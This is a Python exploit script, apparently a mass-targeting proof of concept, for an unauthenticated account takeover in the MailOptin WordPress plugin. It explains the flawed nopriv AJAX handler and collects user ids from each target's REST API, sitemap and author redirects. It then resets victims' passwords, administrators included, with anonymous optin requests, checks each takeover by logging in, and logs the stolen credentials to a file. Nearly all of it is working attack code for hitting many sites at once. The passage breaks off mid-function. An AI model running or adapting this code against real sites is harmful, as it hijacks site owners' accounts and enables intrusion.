#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MailOptin - unauthenticated WordPress account takeover, multi-target.

    pip install aiohttp rich
    python work\poc_ultimate.py

Run with no arguments: it asks for the path to a list of target URLs and for
the thread count. Every prompt has a default, --yes skips them.

The list is one target per line - a URL or a bare host, scheme optional,
'#' starts a comment:

    # sites.txt
    https://example.com
    example.org
    http://10.0.0.5:8080/subdir

Every hit is appended to the results file immediately, in one line:

    https://example.com/wp-login.php#username@password

There is NO username wordlist and none is needed. Usernames and user ids are
discovered per target through WordPress itself, over four independent
channels that run concurrently and are merged:

    1  /wp-json/wp/v2/users?per_page=100&page=N   ids + slugs, 1 req / 100 users
    2  /?rest_route=/wp/v2/users&per_page=100     same, for plain permalinks
    3  /wp-sitemap-users-1.xml                    author slugs -> ?slug= lookup
    4  /?author=N                                 canonical redirect, blind ids

There is no "is this WordPress" pre-flight. The first request already does
real work: it is the discovery call itself.

--------------------------------------------------------------------------------
WHAT IS EXPLOITED
--------------------------------------------------------------------------------
MailOptin registers its optin endpoint as a *nopriv* AJAX action, so it runs for
anonymous visitors with no cookie, no nonce and no capability check:

    AjaxHandler.php:43   wp_ajax_nopriv_{ subscribe_to_email_list }

AbstractConnect::form_custom_field_mappings() (AbstractConnect.php:81-99)
returns the mapping supplied by the REQUEST before it looks at the one the site
owner saved:

    if ( isset( $this->extras['form_custom_field_mappings'] ) ) {
        return $this->extras['form_custom_field_mappings'];
    }

AjaxHandler.php:989 fills $extras from the whole payload, so an anonymous POST
decides which wp_insert_user() fields get written (Subscription.php:36-40):

    foreach ( $custom_field_mappings as $wp_field => $payload_key ) {
        $user_fields[ $wp_field ] = esc_html( $this->extras[ $payload_key ] );
    }

Two primitives, both confirmed against a live WordPress install:

  CREATE    user_login + user_pass, no ID  ->  wp_insert_user() inserts, and the
             attacker owns an account whose name and password they chose.
             Subscription.php:62 replaces a requested 'administrator' with the
             new account's own role, so a fresh account is capped at the site
             default role.

  TAKEOVER  ID + user_pass  ->  wp_insert_user() takes the update path and
             stores whatever arrived, so the password becomes the attacker's.
             Asking for 'administrator' blanks the role, array_filter() drops
             the key, and the victim KEEPS its own role - which is how an
             administrator session survives.

Why nothing has to be crawled:
  * optin_uuid is not authoritative. AjaxHandler.php:705 takes the explicit
    optin_campaign_id, never cross-checks it against the uuid, and never calls
    is_activated(). Campaign ids are small integers, so they are counted.
  * Campaign settings live in wp_options keyed by id, so a campaign whose
    database row was deleted still executes.
  * {"success":true} does NOT mean a user was written - a lead_bank_only
    campaign answers exactly that before any connection runs. The JSON is never
    treated as proof. The only oracle is a real login.

--------------------------------------------------------------------------------
HOW IT STAYS FAST
--------------------------------------------------------------------------------
  stage 1  ONE optin POST per (campaign, account). A write implies the
           connection ran, which implies success:true, so every 500, every
           success:false and every non-JSON reply dies here for the cost of the
           single request it already took.
  stage 2  login verification, only for stage-1 survivors, and it runs
           SEQUENTIALLY per target: one wp-login.php POST, one admin screen,
           one profile read. Sequential on purpose - concurrent logins on a
           single cookie jar log each other out.
           A single GET of /wp-admin/options-general.php separates all three
           outcomes: 200 inside wp-admin is an administrator, 403 inside
           wp-admin is a logged-in non-admin, a final URL of wp-login.php is
           anonymous.

Plus keep-alive connections, targets in parallel, and four adaptive behaviours
described in CampaignMemory and run_site.
"""
import argparse
import asyncio
import datetime
import hashlib
import html as html_lib
import json
import os
import random
import re
import string
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence, Tuple

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import (Progress, SpinnerColumn, TextColumn, BarColumn,
                               TimeElapsedColumn, MofNCompleteColumn)
    from rich import box
    RICH = True
except Exception:
    RICH = False

try:
    import aiohttp
except Exception:
    sys.stderr.write("[!] pip install aiohttp rich\n")
    sys.exit(2)

# A legacy Windows console can default to a code page such as cp1256 that cannot
# encode what Rich draws, which kills the run mid-print.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

SPINNER = "line"           # ASCII only, safe on any code page
STARTED = time.time()


# =============================================================================
# phpass - byte-exact port of wp-includes/class-phpass.php
# =============================================================================

ITOA64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def _encode64(data: bytes, count: int) -> str:
    if not data:
        return ""
    out = []
    n = len(data)
    i = 0
    while True:
        value = data[i % n]
        i += 1
        out.append(ITOA64[value & 0x3F])
        if i < count:
            value |= data[i % n] << 8
        out.append(ITOA64[(value >> 6) & 0x3F])
        if i >= count:
            break
        i += 1
        if i < count:
            value |= data[i % n] << 16
        out.append(ITOA64[(value >> 12) & 0x3F])
        if i >= count:
            break
        i += 1
        out.append(ITOA64[(value >> 18) & 0x3F])
        if i >= count:
            break
    return "".join(out)


def _crypt_private(password: str, setting: str) -> str:
    if setting[:3] not in ("$P$", "$H$"):
        return "*0"
    count_log2 = ITOA64.find(setting[3])
    if count_log2 < 7 or count_log2 > 30:
        return "*1"
    count = 1 << count_log2
    salt = setting[4:12]
    if len(salt) != 8:
        return "*1"
    pw = password.encode("utf-8")
    digest = hashlib.md5(salt.encode("ascii") + pw).digest()
    for _ in range(count):
        digest = hashlib.md5(digest + pw).digest()
    return setting[:12] + _encode64(digest, 16)


def phpass_hash(password: str) -> str:
    for _ in range(10):
        setting = "$P$B" + _encode64(os.urandom(6), 6)
        result = _crypt_private(password, setting)
        if len(result) == 34 and not result.startswith("*"):
            return result
    raise RuntimeError("phpass_hash failed")


PHPASS_VECTORS = [
    ("password", "$P$BjAHG3xmA", "$P$BjAHG3xmAhzDfA7wdySMMuMcGEjjUS1"),
    ("hunter2", "$P$BkQHK3/nB", "$P$BkQHK3/nBW/bTBuNutkxgvml3bPL/t1"),
    ("Tr0ub4dor&3", "$P$Bl6oP33XE", "$P$Bl6oP33XEd0Lr/YvYqaheCCgfAyyo51"),
    ("", "$P$BmMYA47XF", "$P$BmMYA47XFTl2E7UD75Dg24jWlPNnql."),
    ("a", "$P$BncIG4BXG", "$P$BncIG4BXGPPGVI62lujhKX/AxR.SXK1"),
    ("p@ss w0rd!", "$P$BosIK4FXH", "$P$BosIK4FXHtuNgEwvnqf1wUMBZT5.Tf0"),
]


def phpass_selftest() -> bool:
    """Never send a hash WordPress might not accept."""
    for password, setting, expected in PHPASS_VECTORS:
        if _crypt_private(password, setting) != expected:
            return False
    probe = phpass_hash("round trip")
    return probe.startswith("$P$B") and len(probe) == 34


# =============================================================================
# constants
# =============================================================================

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
AJAX_ACTION = "subscribe_to_email_list"
WPCONN = "WordPressUserRegistrationConnect"
LOGIN_PATH = "/wp-login.php"

# The single screen used to classify a session. Measured against a logged-in
# EDITOR: options-general.php, users.php, plugins.php, themes.php and
# options-reading.php all answer 403, while tools.php, index.php and edit.php
# answer 200. Only a 200 from options-general.php counts as proof, because
# tools.php and index.php render for any subscriber and would hand out a
# completely fictional "administrator verified".
ADMIN_PROBE = "/wp-admin/options-general.php"
PROFILE_PATH = "/wp-admin/profile.php"
ADMIN_USERS_PATH = "/wp-admin/users.php"
# WordPress lists 20 accounts per page by default; only used to stop paging.
ADMIN_USERS_PER_PAGE = 20

ANON, MEMBER, ADMIN = "anonymous", "member", "administrator"

BRACKET_RE = re.compile(r"[\[{]")
AUTHOR_RE = re.compile(r"/author/([^/?#]+)/?$")
SITEMAP_LOC_RE = re.compile(r"<loc>\s*([^<]*?/author/([^/<]+)/?)\s*</loc>")

# profile.php carries the authoritative values. Each is tried in several shapes
# because the markup differs between WordPress versions and themes.
RE_USER_LOGIN = re.compile(
    r'id=["\']user_login["\'][^>]*value=["\']([^"\']+)["\']', re.I)
RE_USER_LOGIN_ALT = re.compile(
    r'value=["\']([^"\']+)["\'][^>]*id=["\']user_login["\']', re.I)
# Some security plugins strip the id but leave the name, and a few themes render
# the field through a helper that only keeps one of the two.
RE_USER_LOGIN_NAME = re.compile(
    r'name=["\']user_login["\'][^>]*value=["\']([^"\']+)["\']', re.I)
RE_USER_LOGIN_NAME_ALT = re.compile(
    r'value=["\']([^"\']+)["\'][^>]*name=["\']user_login["\']', re.I)
RE_EMAIL = re.compile(r'id=["\']email["\'][^>]*value=["\']([^"\']+)["\']', re.I)
RE_NICKNAME = re.compile(
    r'id=["\']nickname["\'][^>]*value=["\']([^"\']*)["\']', re.I)
RE_USER_ID = re.compile(r'name=["\']checkuser_id["\'][^>]*value=["\'](\d+)["\']',
                         re.I)

# wp-admin/users.php is the only page that states the real user_login for EVERY
# account, and a takeover session can already read it. Quote style varies between
# WordPress versions (7.x emits <tr id='user-2'>), so both are accepted.
USERS_ROW_RE = re.compile(
    r"<tr\s+id=['\"]user-(\d+)['\"][^>]*>(.*?)</tr>", re.I | re.S)
USERS_NAME_RES = (
    re.compile(r"<span[^>]*class=['\"][^'\"]*\busername\b[^'\"]*['\"][^>]*>"
               r"([^<]+?)<", re.I),
    re.compile(r"aria-label=['\"]([^'\"]+)['\"][^>]*data-colname=['\"]Username",
               re.I),
    re.compile(r"data-colname=['\"]Username['\"][^>]*aria-label=['\"]([^'\"]+)",
               re.I),
    re.compile(r"Select\s+([^<]+?)\s*</span>", re.I),
)

# A reply this shape means the AJAX action does not exist on the target.
DEAD_STATUS = (400, 401, 403, 404, 405, 500, 501)


def now_iso() -> str:
    return datetime.datetime.now().isoformat(timespec="seconds")


def random_token(count: int = 13) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(count))


def slugify(text: str, limit: int = 14) -> str:
    return re.sub(r"\W", "_", text)[:limit].strip("_") or "target"


def parse_json_loose(text: Optional[str]) -> Optional[Any]:
    """
    Parse JSON that may be preceded by junk.

    PHP's built-in server, and plenty of real hosts, prepend deprecation
    notices, warnings or a BOM to the body, so trusting offset 0 loses the
    response. Notice text also carries its own brackets - PHP's own warning
    quotes $_SERVER['argv'] - so the first "[" is regularly a dead end and the
    first "{" is regularly the inner object of a list whose "]" got skipped.
    Every bracket is tried; the decode that consumes the whole body wins.
    """
    if not text:
        return None
    decoder = json.JSONDecoder()
    partial: Optional[Any] = None
    seen = 0
    for match in BRACKET_RE.finditer(text):
        idx = match.start()
        try:
            value, end = decoder.raw_decode(text[idx:])
        except ValueError:
            continue
        seen += 1
        if text[idx + end:].strip() == "":
            return value
        if partial is None:
            partial = value
        if seen >= 64:
            break
    return partial


# =============================================================================
# models
# =============================================================================

@dataclass
class Target:
    base: str
    scheme: str
    host: str
    port: int
    netloc: str
    prefix: str

    def abs(self, path: str) -> str:
        """Absolute URL for a site-relative path, honouring a sub-directory
        install prefix (https://host/blog/ + /wp-login.php)."""
        if "://" in path:
            return path
        if not path.startswith("/"):
            path = "/" + path
        return self.base + path

    @property
    def login_url(self) -> str:
        return self.base + LOGIN_PATH


def parse_target(url: str) -> Optional[Target]:
    raw = (url or "").strip().lstrip("\ufeff").strip()
    if not raw:
        return None
    if "://" not in raw:
        raw = "http://" + raw
    try:
        parts = urllib.parse.urlsplit(raw)
        port = parts.port or (443 if parts.scheme == "https" else 80)
    except ValueError:
        return None
    if not parts.hostname or not parts.netloc:
        return None
    prefix = parts.path.rstrip("/")
    return Target("%s://%s%s" % (parts.scheme, parts.netloc, prefix),
                  parts.scheme, parts.hostname, port, parts.netloc, prefix)


@dataclass
class UserRec:
    uid: int
    names: List[str] = field(default_factory=list)
    sources: List[str] = field(default_factory=list)

    def add_name(self, name: Optional[str], source: str) -> None:
        name = (name or "").strip()
        if name and name not in self.names:
            self.names.append(name)
        if source not in self.sources:
            self.sources.append(source)

    @property
    def label(self) -> str:
        return self.names[0] if self.names else "id%d" % self.uid

    @property
    def via(self) -> str:
        return "+".join(self.sources)


@dataclass
class Profile:
    """What profile.php says about the session that is logged in right now."""
    user_login: Optional[str] = None
    user_email: Optional[str] = None
    nickname: Optional[str] = None
    user_id: Optional[int] = None


@dataclass
class Hit:
    site: str
    login_url: str
    username: str
    password: str
    mode: str
    campaign_id: int
    user_id: Optional[int]
    email: str
    access: str
    ts: str = field(default_factory=now_iso)
    detail: str = ""

    @property
    def line(self) -> str:
        """The one line written to the results file."""
        return "%s#%s@%s" % (self.login_url, self.username, self.password)

    @property
    def administrator(self) -> bool:
        return self.access == ADMIN


@dataclass
class SiteResult:
    target: Target
    users: List[UserRec] = field(default_factory=list)
    counts: Dict[str, int] = field(default_factory=dict)
    hits: List[Hit] = field(default_factory=list)
    requests: int = 0
    note: str = ""


class Mailbox:
    """
    One address per (mode, user id), generated once and then reused.

    A single shared takeover address is a correctness bug, not untidiness. The
    connection rewrites user_email onto the victim, so once the first takeover
    has landed, two accounts answer to the same address and wp_signon() resolves
    it to whichever it prefers. The session then belongs to somebody else, so
    profile.php reports the wrong user_login and the recorded credential is the
    wrong account's - the exact way a real username degrades into a
    placeholder. One address per victim removes the ambiguity at the source.
    """

    def __init__(self, template: str):
        self.template = template
        self._addresses: Dict[Tuple[str, Optional[int]], str] = {}

    def get(self, mode: str, uid: Optional[int]) -> str:
        key = (mode, uid)
        address = self._addresses.get(key)
        if address is None:
            # The id keeps addresses distinct inside one run and across runs:
            # only the account actually attacked ever answers to this one.
            suffix = "new" if uid is None else str(uid)
            address = (self.template.replace("{mode}", mode.lower())
                       .replace("{uid}", suffix))
            self._addresses[key] = address
        return address


# =============================================================================
# results file
# =============================================================================

class VulnLog:
    """
    One line per hit, appended, flushed and fsynced the moment it is proven, so
    an interrupted run still leaves working credentials on disk.

        https://example.com/wp-login.php#username@password
    """

    def __init__(self, path: str):
        self.path = path
        self.count = 0
        self._lock = asyncio.Lock()
        self._seen = set()
        directory = os.path.dirname(os.path.abspath(path))
        if directory and not os.path.isdir(directory):
            os.makedirs(directory, exist_ok=True)
        if not os.path.exists(path):
            open(path, "a", encoding="utf-8").close()

    async def header(self, text: str) -> None:
        async with self._lock:
            with open(self.path, "a", encoding="utf-8") as fh:
                fh.write("# %s  %s\n" % (now_iso(), text))
                fh.flush()

    async def write(self, hit: Hit, console: Optional["Console"]) -> bool:
        line = hit.line
        if line in self._seen:
            return False
        async with self._lock:
            if line in self._seen:
                return False
            self._seen.add(line)
            with open(self.path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
                fh.flush()
                os.fsync(fh.fileno())
            self.count += 1
        if console:
            style = "bold green" if hit.administrator else "bold yellow"
            console.print("  [%s]+ %s[/]" % (style, line))
        else:
            print("+ " + line)
        return True


# =============================================================================
# adaptive campaign ordering, shared by every target in the run
# =============================================================================

class CampaignMemory:
    """
    Learns which campaign ids actually run on this fleet.

    WordPress installations share plugins, themes and hosts, so a campaign id
    that works on one target is very likely to work on the next. Every accepted
    reply bumps that id, and later targets try the proven ids first. That turns
    a 40-campaign blind sweep on target N into a two or three request probe for
    every target after the first.
    """

    def __init__(self) -> None:
        self.hits: Dict[int, int] = {}

    def record(self, campaign_id: int) -> None:
        self.hits[campaign_id] = self.hits.get(campaign_id, 0) + 1

    def ordered(self, limit: int) -> List[int]:
        proven = sorted((c for c, n in self.hits.items() if n and c <= limit),
                        key=lambda c: (-self.hits[c], c))
        rest = [c for c in range(1, limit + 1) if c not in self.hits]
        return proven + rest


# =============================================================================
# async HTTP
# =============================================================================

class Resp:
    __slots__ = ("status", "text", "final")

    def __init__(self, status: int, text: str, final: str):
        self.status = status
        self.text = text
        self.final = final


class Client:
    """One aiohttp session per target: own cookie jar, keep-alive connections."""

    def __init__(self, target: Target, timeout: float = 12.0,
                 insecure: bool = False):
        self.t = target
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.ssl = False if insecure else None
        self.jar = aiohttp.CookieJar(unsafe=True, quote_cookie=False)
        self.session: Optional[aiohttp.ClientSession] = None
        self.requests = 0

    async def __aenter__(self) -> "Client":
        self.session = aiohttp.ClientSession(
            cookie_jar=self.jar,
            headers={"User-Agent": UA, "Accept": "*/*"},
            timeout=self.timeout,
            connector=aiohttp.TCPConnector(limit=0, limit_per_host=0,
                                          keepalive_timeout=60,
                                          ttl_dns_cache=300),
        )
        return self

    async def __aexit__(self, *exc) -> None:
        if self.session is not None:
            await self.session.close()
            self.session = None

    async def get_follow(self, path: str, hops: int = 5) -> Resp:
        """GET, following same-origin redirects so the final URL is knowable."""
        url = self.t.abs(path)
        status, text, final = 0, "", path
        for _ in range(hops + 1):
            self.requests += 1
            async with self.session.get(url, allow_redirects=False,
                                        ssl=self.ssl) as resp:
                status = resp.status
                text = (await resp.read()).decode("utf-8", "replace")
                final = str(resp.url)
            if status not in (301, 302, 303, 307, 308):
                break
            location = resp.headers.get("Location")
            if not location:
                break
            nxt = urllib.parse.urljoin(final, location)
            parts = urllib.parse.urlsplit(nxt)
            if parts.netloc and parts.netloc != self.t.netloc:
                break
            url = nxt
            path = (parts.path or "/") + (("?" + parts.query) if parts.query
                                          else "")
        return Resp(status, text, path)

    async def post(self, path: str, data: Any,
                   referer: Optional[str] = None) -> Resp:
        url = self.t.abs(path)
        self.requests += 1
        async with self.session.post(
                url, data=data, allow_redirects=False, ssl=self.ssl,
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Referer": referer or url}) as resp:
            text = (await resp.read()).decode("utf-8", "replace")
            return Resp(resp.status, text, str(resp.url))


# =============================================================================
# user discovery - WordPress only, no wordlist of any kind
# =============================================================================

def _store(users: Dict[int, UserRec], uid: Any, name: Optional[str],
           source: str) -> None:
    if not isinstance(uid, int) or isinstance(uid, bool) or uid <= 0:
        return
    rec = users.get(uid)
    if rec is None:
        rec = users[uid] = UserRec(uid)
    rec.add_name(name, source)


async def discover_via_rest(client: Client, max_pages: int = 3
                            ) -> Dict[int, UserRec]:
    """
    /wp-json/wp/v2/users is public by default and returns id + slug + name, one
    request per 100 accounts - the cheapest authoritative channel. Both the
    pretty and the ?rest_route= form are tried, because plain permalinks disable
    /wp-json/.
    """
    found: Dict[int, UserRec] = {}
    for page in range(1, max_pages + 1):
        got_any = False
        for template in ("/wp-json/wp/v2/users?per_page=100&page=%d&context=embed",
                         "/?rest_route=/wp/v2/users&per_page=100&page=%d"):
            path = template % page
            try:
                resp = await client.get_follow(path)
            except Exception:
                continue
            data = parse_json_loose(resp.text)
            if not isinstance(data, list) or not data:
                if got_any:
                    return found
                continue
            got_any = True
            for entry in data:
                if not isinstance(entry, dict):
                    continue
                _store(found, entry.get("id"),
                       entry.get("slug") or entry.get("name"), "rest")
            if len(data) < 100:
                return found
        if not got_any:
            break
    return found


async def resolve_slugs(client: Client, slugs: Sequence[str],
                        threads: int) -> Dict[int, UserRec]:
    """Turn slugs into ids with /wp-json/wp/v2/users?slug=. One request each."""
    found: Dict[int, UserRec] = {}
    sem = asyncio.Semaphore(max(1, threads))

    async def one(slug: str):
        path = "/wp-json/wp/v2/users?slug=%s&per_page=1" % urllib.parse.quote(slug)
        async with sem:
            try:
                resp = await client.get_follow(path)
            except Exception:
                return None
        data = parse_json_loose(resp.text)
        if isinstance(data, list) and data and isinstance(data[0], dict):
            uid = data[0].get("id")
            if isinstance(uid, int):
                return uid, slug
        return None

    for uid, slug in await asyncio.gather(*(one(s) for s in slugs)):
        _store(found, uid, slug, "slug")
    return found


async def discover_via_sitemap(client: Client, threads: int
                               ) -> Dict[int, UserRec]:
    """wp-sitemap-users-1.xml lists one author archive per user."""
    for path in ("/wp-sitemap-users-1.xml", "/wp-sitemap.xml"):
        try:
            resp = await client.get_follow(path)
        except Exception:
            continue
        slugs: List[str] = []
        for match in SITEMAP_LOC_RE.finditer(resp.text or ""):
            slug = urllib.parse.unquote(match.group(2) or "").strip()
            if slug and slug not in slugs:
                slugs.append(slug)
        if slugs:
            found = await resolve_slugs(client, slugs, threads)
            for uid in list(found):
                found[uid].add_name(None, "sitemap")
            return found
    return {}


async def probe_author(client: Client, uid: int) -> Optional[Tuple[int, str]]:
    """
    ?author=N answers 404 for an id that does not exist, but a 200 proves
    nothing on its own - the canonical redirect can land on the home page. An id
    only counts when the final path is an /author/... path as well.
    """
    try:
        resp = await client.get_follow("/?author=%d" % uid)
    except Exception:
        return None
    if resp.status != 200:
        return None
    match = AUTHOR_RE.search(resp.final or "")
    if not match:
        return None
    return uid, urllib.parse.unquote(match.group(1))


async def discover_via_authors(client: Client, max_users: int,
                               threads: int) -> Dict[int, UserRec]:
    """Blind id sweep - the only channel that finds users with no published post."""
    found: Dict[int, UserRec] = {}
    sem = asyncio.Semaphore(max(1, threads))

    async def one(uid: int):
        async with sem:
            return await probe_author(client, uid)

    for uid, slug in filter(None, await asyncio.gather(
            *(one(i) for i in range(1, max_users + 1)))):
        _store(found, uid, slug, "author")
    return found


async def discover_users(client: Client, max_users: int,
                         threads: int) -> Tuple[Dict[int, UserRec], Dict[str, int]]:
    """
    All four channels. REST and the sitemap run together; the author sweep is
    blind and slower, so it starts at the same time and everything is merged at
    the end. Nothing is read from disk.
    """
    merged: Dict[int, UserRec] = {}

    def absorb(source_map: Dict[int, UserRec], source: str) -> None:
        for uid, rec in source_map.items():
            target = merged.setdefault(uid, UserRec(uid))
            for name in rec.names:
                target.add_name(name, source)

    rest_task = asyncio.ensure_future(discover_via_rest(client))
    sitemap_task = asyncio.ensure_future(discover_via_sitemap(client, threads))
    author_task = asyncio.ensure_future(
        discover_via_authors(client, max_users, threads))
    try:
        rest, sitemap, authors = await asyncio.gather(rest_task, sitemap_task,
                                                      author_task)
    finally:
        for task in (rest_task, sitemap_task, author_task):
            if not task.done():
                task.cancel()

    absorb(rest, "rest")
    absorb(sitemap, "sitemap")
    absorb(authors, "author")
    return merged, {"rest": len(rest), "sitemap": len(sitemap),
                    "author": len(authors), "total": len(merged)}


# =============================================================================
# the exploit
# =============================================================================

def ajax_path() -> str:
    return "/?" + urllib.parse.urlencode({"mailoptin-ajax": AJAX_ACTION})


def build_fields(target: Target, campaign_id: int, email: str,
                 mappings: Dict[str, str], values: Dict[str, Any],
                 role: Optional[str]) -> List[Tuple[str, Any]]:
    fields: List[Tuple[str, Any]] = [
        ("optin_data[optin_uuid]", random_token()),
        # AjaxHandler.php:705 - an explicit id wins outright, is never validated
        # against the uuid, and is_activated() is never consulted.
        ("optin_data[optin_campaign_id]", campaign_id),
        ("optin_data[email]", email),
        ("optin_data[name]", "poc"),
        ("optin_data[user_agent]", UA),
        ("optin_data[conversion_page]", target.base + "/"),
        ("optin_data[referrer]", target.base + "/"),
        # AjaxHandler.php:770-781 rejects submissions younger than ~1.5s.
        ("optin_data[_mo_timestamp]", int(time.time()) - 5),
    ]
    for wp_field, payload_key in mappings.items():
        fields.append(("optin_data[form_custom_field_mappings][%s]" % wp_field,
                       payload_key))
    for key, value in values.items():
        fields.append(("optin_data[%s]" % key, value))
    if role:
        fields.append(("optin_data[mo-list-subscription-integration]", WPCONN))
        fields.append(("optin_data[mo-list-subscription]", role))
    return fields


def accepted(parsed: Any) -> bool:
    """
    A write implies the connection ran, which implies success:true, so this is
    a safe pre-filter: it never discards a real hit, it only avoids spending
    login requests on campaigns that never connected. A lead_bank_only campaign
    also answers true - which is exactly why stage 2 still proves the login.
    """
    return isinstance(parsed, dict) and parsed.get("success") is True


def landed_in_admin(prefix: str, final_path: str) -> bool:
    """
    An unauthenticated GET of /wp-admin/... is answered with a redirect to
    wp-login.php, which then returns 200. Only the final path separates a real
    session from the login form, so the status code alone is never enough.
    """
    path = urllib.parse.urlsplit(final_path or "").path or "/"
    if path.startswith(prefix + "/wp-admin/") or path.startswith("/wp-admin/"):
        return "wp-login.php" not in path
    return False


async def send_optin(client: Client, campaign_id: int, email: str,
                     mappings: Dict[str, str], values: Dict[str, Any],
                     role: Optional[str]) -> Tuple[Optional[Any], int]:
    """One anonymous POST. Returns (parsed_json, http_status)."""
    fields = build_fields(client.t, campaign_id, email, mappings, values, role)
    try:
        resp = await client.post(ajax_path(), fields,
                                 referer=client.t.base + "/")
    except Exception:
        return None, 0
    return parse_json_loose(resp.text), resp.status


def stage_one_fields(mode: str, user_id: Optional[int], new_login: str,
                     secret: str) -> Tuple[Dict[str, str], Dict[str, Any],
                                           Optional[str]]:
    """
    CREATE    user_login + user_pass, no ID, role 'editor'. Asking for
              'administrator' on the create path only adds a request, because
              Subscription.php:62 overwrites it with the new account's own role.
    TAKEOVER  ID + user_pass, role 'administrator' - required, because on the
              update path Subscription.php:62 substitutes the victim's CURRENT
              role, the key is dropped by array_filter() and the real role stays.
              Without an integration+role pair the connection never runs.
    """
    if mode == "CREATE" or user_id is None:
        return ({"user_login": "poc_login", "user_pass": "poc_pass"},
                {"poc_login": new_login, "poc_pass": secret}, "editor")
    return ({"ID": "poc_id", "user_pass": "poc_pass"},
            {"poc_id": user_id, "poc_pass": secret}, "administrator")


async def classify_session(client: Client) -> str:
    """One request splits the three outcomes. See ADMIN_PROBE."""
    try:
        resp = await client.get_follow(ADMIN_PROBE)
    except Exception:
        return ANON
    if not landed_in_admin(client.t.prefix, resp.final):
        return ANON
    return ADMIN if resp.status == 200 else MEMBER


async def read_profile(client: Client) -> Profile:
    """
    Read the authoritative identity of whoever is logged in.

    A takeover rewrites user_pass (and user_email) but never touches user_login,
    so profile.php is where the real victim name comes from - it is the value
    worth writing to the results file. Each field is matched in more than one
    attribute order because the markup moves between WordPress versions.
    """
    try:
        resp = await client.get_follow(PROFILE_PATH)
    except Exception:
        return Profile()
    if resp.status != 200 or not landed_in_admin(client.t.prefix, resp.final):
        return Profile()
    text = resp.text or ""

    login = (RE_USER_LOGIN.search(text) or RE_USER_LOGIN_ALT.search(text)
             or RE_USER_LOGIN_NAME.search(text)
             or RE_USER_LOGIN_NAME_ALT.search(text))
    email = RE_EMAIL.search(text)
    nick = RE_NICKNAME.search(text)
    uid = RE_USER_ID.search(text)

    user_id = None
    if uid:
        try:
            user_id = int(uid.group(1))
        except ValueError:
            user_id = None
    return Profile(login.group(1) if login else None,
                   email.group(1) if email else None,
                   nick.group(1) if nick else None,
                   user_id)


async def read_admin_user_logins(client: Client, wanted: Optional[int] = None,
                                 max_pages: int = 3
                                 ) -> Dict[int, str]:
    """
    user id -> real user_login, read from wp-admin/users.php.

    profile.php only ever describes the account whose session is live.
    users.php lists every account with its actual user_login, which is what
    turns a bare id into a usable username - and it is reachable precisely
    because the takeover already produced an administrator session. Pages are
    walked only until the wanted id shows up.
    """
    mapping: Dict[int, str] = {}
    for page in range(1, max_pages + 1):
        path = (ADMIN_USERS_PATH if page == 1
                else "%s?paged=%d" % (ADMIN_USERS_PATH, page))
        try:
            resp = await client.get_follow(path)
        except Exception:
            break
        if resp.status != 200 or not landed_in_admin(client.t.prefix,
                                                      resp.final):
            break
        rows = USERS_ROW_RE.findall(resp.text or "")
        if not rows:
            break
        for raw_uid, row in rows:
            try:
                uid = int(raw_uid)
            except ValueError:
                continue
            for pattern in USERS_NAME_RES:
                found = pattern.search(row)
                if found and found.group(1).strip():
                    mapping[uid] = html_lib.unescape(found.group(1)).strip()
                    break
        if wanted is not None and wanted in mapping:
            break
        if len(rows) < ADMIN_USERS_PER_PAGE:
            break
    return mapping


async def resolve_username(client: Client, profile: Profile, uid: Optional[int],
                           by_uid: Dict[int, UserRec], identifier: str
                           ) -> Tuple[Optional[str], str]:
    """
    The real user_login, most authoritative source first.

    1. profile.php - what the live session says it is. Exact by definition.
    2. users.php   - the admin account list, exact for any id.
    3. /author/    - the nicename. Usually equals the login, but WordPress
       sanitises it, so "john.doe" is published as "johndoe". It is returned
       last and always labelled, because a wrong username is worse than none.

    Returns (username, source); username is None when nothing authoritative
    answered, and the caller must not invent one.
    """
    if profile.user_login:
        return profile.user_login, "profile.php"
    if uid is not None:
        admin_names = await read_admin_user_logins(client, uid)
        if uid in admin_names:
            return admin_names[uid], "users.php"
        rec = by_uid.get(uid)
        if rec is not None and rec.names:
            return rec.label, "author-slug (unverified)"
    return None, ""


async def login_and_classify(client: Client, identifier: str,
                             password: str) -> str:
    try:
        await client.post(LOGIN_PATH,
                          {"log": identifier, "pwd": password,
                           "wp-submit": "Log In", "testcookie": "1",
                           "redirect_to": client.t.base + "/wp-admin/"},
                          referer=client.t.base + LOGIN_PATH)
    except Exception:
        return ANON
    return await classify_session(client)


# =============================================================================
# interactive prompts
# =============================================================================

def ask(prompt: str, default: str, cast=str, assume: bool = False) -> Any:
    """Prompt with a default. The default is cast too, so a non-interactive
    stdin (EOFError) still yields the declared type, not a raw string.
    assume=True is --yes: take the default without reading stdin."""
    def coerce(raw: str) -> Any:
        if not raw:
            return cast(default)
        try:
            return cast(raw)
        except (TypeError, ValueError):
            print("  ! %r is not valid here, using %r" % (raw, default))
            return cast(default)
    if assume:
        return coerce("")
    try:
        return coerce(input(prompt).strip())
    except (EOFError, KeyboardInterrupt):
        print()
        return cast(default)


def ask_target_list(explicit: Optional[str],
                    assume: bool = False) -> Tuple[Optional[str], List[str]]:
    """Asks where the list of TARGET SITES is. '-' switches to --url mode."""
    here = os.path.dirname(os.path.abspath(__file__))
    guesses = [os.path.join(here, "sites.txt"),
               os.path.join(os.getcwd(), "sites.txt"),
               os.path.join(os.getcwd(), "targets.txt"),
               os.path.join(os.getcwd(), "urls.txt")]
    suggestion = explicit or next((g for g in guesses if os.path.isfile(g)),
                                  guesses[0])
    answer = ask("list of target URLs [%s] ('-' for one url): " % suggestion,
                 suggestion, assume=assume)
    if answer.lower() in ("-", "skip", "none", "no"):
        return None, []
    if not os.path.isfile(answer):
        print("  ! %s not found" % answer)
        return answer, []
    lines = []
    # utf-8-sig, not utf-8: a list saved by PowerShell 5.1 or Notepad starts with
    # a BOM, and an unstripped U+FEFF turns "127.0.0.1" into a host that resolves
    # nowhere.
